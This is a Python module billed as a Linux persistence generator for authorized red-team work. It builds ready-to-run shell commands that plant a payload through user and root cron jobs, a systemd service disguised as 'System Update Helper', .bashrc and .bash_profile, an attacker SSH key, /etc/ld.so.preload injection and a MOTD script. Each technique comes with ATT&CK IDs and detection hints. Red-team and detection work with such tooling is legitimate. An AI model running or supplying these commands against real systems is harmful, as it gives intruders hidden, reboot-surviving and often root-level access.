"""
Linux persistence technique generator.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "cron_user",
    "cron_root",
    "systemd_service",
    "bashrc",
    "ssh_authorized_keys",
    "ld_preload",
    "motd_script",
)


@dataclass
class LinuxPersistResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


def _cron_user(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * {payload} >/dev/null 2>&1') | crontab -"
    return LinuxPersistResult(
        command=cmd,
        technique="cron_user",
        notes=f"Adds cron entry running {payload} every 5 minutes as current user.",
        techniques=["T1053.003"],
        risk="MEDIUM",
        detections=[
            "Crontab modification (auditd: openat on /var/spool/cron/crontabs/)",
            "New cron execution at unexpected interval",
            "Process launched from crond spawning network connections",
        ],
    )


def _cron_root(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    cron_file = f"/etc/cron.d/{name}"
    cmd = f"echo '*/5 * * * * root {payload} >/dev/null 2>&1' > {cron_file}"
    return LinuxPersistResult(
        command=cmd,
        technique="cron_root",
        notes=f"Writes system-wide cron file {cron_file} running as root. Requires root.",
        techniques=["T1053.003"],
        risk="HIGH",
        detections=[
            "File write to /etc/cron.d/ by non-root or unexpected process",
            "auditd: openat on /etc/cron.d/ with write mode",
            "New file in /etc/cron.d/ detected by HIDS",
        ],
    )


def _systemd_service(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    unit_file = f"/etc/systemd/system/{name}.service"
    cmd = (
        f"cat > {unit_file} << 'EOF'\n"
        f"[Unit]\n"
        f"Description=System Update Helper\n"
        f"After=network.target\n\n"
        f"[Service]\n"
        f"Type=simple\n"
        f"ExecStart={payload}\n"
        f"Restart=always\n"
        f"RestartSec=30\n\n"
        f"[Install]\n"
        f"WantedBy=multi-user.target\n"
        f"EOF\n"
        f"systemctl daemon-reload && systemctl enable {name} && systemctl start {name}"
    )
    return LinuxPersistResult(
        command=cmd,
        technique="systemd_service",
        notes=f"Creates and enables systemd service {name} running {payload}. Survives reboots. Requires root.",
        techniques=["T1543.002"],
        risk="HIGH",
        detections=[
            "New .service file in /etc/systemd/system/ (inotify/HIDS)",
            "systemctl enable called on unknown unit (auditd)",
            "Service process spawning reverse shell connections",
        ],
    )


def _bashrc(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    cmd = (
        f"echo 'nohup {payload} >/dev/null 2>&1 &' >> ~/.bashrc && "
        f"echo 'nohup {payload} >/dev/null 2>&1 &' >> ~/.bash_profile"
    )
    return LinuxPersistResult(
        command=cmd,
        technique="bashrc",
        notes="Appends payload launch to .bashrc and .bash_profile. Executes on interactive login/shell.",
        techniques=["T1546.004"],
        risk="MEDIUM",
        detections=[
            "~/.bashrc modification (auditd: openat with write on .bashrc)",
            "Payload process launched by bash (parent: bash → payload)",
            "HIDS alert on .bashrc/.bash_profile content change",
        ],
    )


def _ssh_authorized_keys(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    # payload here should be an SSH public key
    cmd = (
        f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
        f"echo '{payload}' >> ~/.ssh/authorized_keys && "
        f"chmod 600 ~/.ssh/authorized_keys"
    )
    return LinuxPersistResult(
        command=cmd,
        technique="ssh_authorized_keys",
        notes="Adds attacker SSH public key for passwordless access. Replace payload with your public key.",
        techniques=["T1098.004"],
        risk="HIGH",
        detections=[
            "~/.ssh/authorized_keys modification (auditd)",
            "SSH login with public key from unexpected IP/key",
            "SIEM: SSH auth success without prior password auth from new source",
        ],
    )


def _ld_preload(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    so_path = f"/tmp/{name}.so"
    cmd = (
        f"# Compile shared library first:\n"
        f"# gcc -shared -fPIC -o {so_path} {name}.c -ldl\n"
        f"echo '{so_path}' >> /etc/ld.so.preload\n"
        f"# OR for user-level: export LD_PRELOAD={so_path}"
    )
    return LinuxPersistResult(
        command=cmd,
        technique="ld_preload",
        notes=(
            f"Injects {so_path} into every dynamically-linked process via ld.so.preload. "
            "Requires root for /etc/ld.so.preload. "
            "LD_PRELOAD env var works per-user without root."
        ),
        techniques=["T1574.006"],
        risk="CRITICAL",
        detections=[
            "/etc/ld.so.preload modification (auditd, HIDS)",
            "LD_PRELOAD env var in process environment (Sysmon on Linux)",
            "Unexpected .so loaded into system processes (eBPF/falco)",
        ],
    )


def _motd_script(payload: str, name: str, lhost: str, lport: int) -> LinuxPersistResult:
    script_path = f"/etc/update-motd.d/99-{name}"
    cmd = (
        f"cat > {script_path} << 'EOF'\n"
        f"#!/bin/bash\n"
        f"nohup {payload} >/dev/null 2>&1 &\n"
        f"EOF\n"
        f"chmod +x {script_path}"
    )
    return LinuxPersistResult(
        command=cmd,
        technique="motd_script",
        notes=f"MOTD scripts run as root on SSH login (Debian/Ubuntu). Creates {script_path}. Requires root.",
        techniques=["T1037.004"],
        risk="HIGH",
        detections=[
            "New script in /etc/update-motd.d/ (HIDS, auditd)",
            "Process spawned by run-parts from sshd (parent chain: sshd→pam→run-parts→payload)",
            "Outbound connection on SSH login",
        ],
    )


_DISPATCH = {
    "cron_user": _cron_user,
    "cron_root": _cron_root,
    "systemd_service": _systemd_service,
    "bashrc": _bashrc,
    "ssh_authorized_keys": _ssh_authorized_keys,
    "ld_preload": _ld_preload,
    "motd_script": _motd_script,
}


def generate_linux_persist(
    technique: str,
    payload: str = "/tmp/payload.sh",
    name: str = "sysupdate",
    lhost: str = "192.168.1.100",
    lport: int = 4444,
) -> LinuxPersistResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](payload, name, lhost, lport)
